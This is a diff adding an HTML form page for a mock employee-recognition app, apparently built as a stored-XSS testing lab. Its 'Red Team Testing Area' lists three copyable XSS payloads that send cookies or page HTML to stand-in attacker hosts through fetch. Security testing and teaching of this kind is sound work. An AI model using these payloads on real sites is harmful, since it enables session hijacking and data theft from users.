@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Submit Kudos - SecureKudos</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <header class="main-header">
+        <div class="header-content">
+            <div class="logo-section">
+                <i class="fas fa-trophy"></i>
+                <h1>SecureKudos</h1>
+            </div>
+            <nav class="main-nav">
+                <a href="index.html" class="nav-link">Dashboard</a>
+                <a href="recognition-wall.html" class="nav-link">Recognition Wall</a>
+                <a href="submit-kudos.html" class="nav-link active">Submit Kudos</a>
+            </nav>
+            <div class="user-section">
+                <span class="user-name">Jane Doe (HR Admin)</span>
+                <img src="https://via.placeholder.com/32/4a90e2/ffffff?text=JD" alt="User" class="user-avatar">
+            </div>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div class="form-container">
+            <section class="form-header">
+                <h2><i class="fas fa-plus-circle"></i> Submit Recognition</h2>
+                <p>Recognize a colleague's outstanding contribution</p>
+            </section>
+
+            <!-- Red Team Testing Panel -->
+            <div class="testing-panel">
+                <h3><i class="fas fa-bug"></i> Red Team Testing Area</h3>
+                <p>Common XSS payloads for testing:</p>
+                <div class="payload-examples">
+                    <code class="payload-example" onclick="copyToClipboard(this.textContent)">
+                        &lt;img src=x onerror='fetch(`https://attacker.tld/c?c=${document.cookie}`)'&gt;
+                    </code>
+                    <code class="payload-example" onclick="copyToClipboard(this.textContent)">
+                        &lt;script&gt;fetch('https://evil.com/steal?data='+document.cookie)&lt;/script&gt;
+                    </code>
+                    <code class="payload-example" onclick="copyToClipboard(this.textContent)">
+                        &lt;svg/onload=fetch('https://attacker.com/?'+btoa(document.documentElement.innerHTML))&gt;
+                    </code>
+                </div>
+                <p class="testing-note">Click any payload to copy. In a real vulnerable app, these would execute on the Recognition Wall.</p>
+            </div>
+
+            <form id="kudos-form" class="kudos-form">
+                <div class="form-group">
+                    <label for="title">Recognition Title</label>
+                    <input type="text" id="title" name="title" placeholder="e.g., Outstanding Team Leadership" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="recipient">Recipient (Optional)</label>
+                    <input type="text" id="recipient" name="recipient" placeholder="Employee name">
+                </div>
+
+                <div class="form-group">
+                    <label for="message">Message</label>
+                    <textarea id="message" name="message" rows="6" 
+                              placeholder="Describe the achievement... (XSS payloads would be injected here)" 
+                              required></textarea>
+                    <small class="form-hint">
+                        <i class="fas fa-info-circle"></i>
+                        In a vulnerable application, this field would accept HTML and execute JavaScript when displayed on the Recognition Wall.
+                    </small>
+                </div>
+
+                <div class="form-group">
+                    <label for="author">Your Name</label>
+                    <input type="text" id="author" name="author" value="Jane Doe" readonly>
+                </div>
+
+                <button type="submit" class="submit-btn">
+                    <i class="fas fa-paper-plane"></i>
+                    Submit Recognition
+                </button>
+
+                <div id="form-status" class="form-status"></div>
+            </form>
+
+            <!-- API Simulation Panel -->
+            <div class="api-panel">
+                <h3><i class="fas fa-code"></i> Simulated API Request</h3>
+                <pre id="api-preview" class="api-preview">
+POST /api/submit-kudos HTTP/1.1
+Content-Type: application/json
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+X-CSRF-Token: a7f3d2e1-9b8c-4567-8901-234567890abc
+
+{
+  "title": "",
+  "message": "",
+  "author": "Jane Doe",
+  "recipient": ""
+}
+                </pre>
+            </div>
+        </div>
+    </main>
+
+    <script src="app.js"></script>
+</body>
+</html>
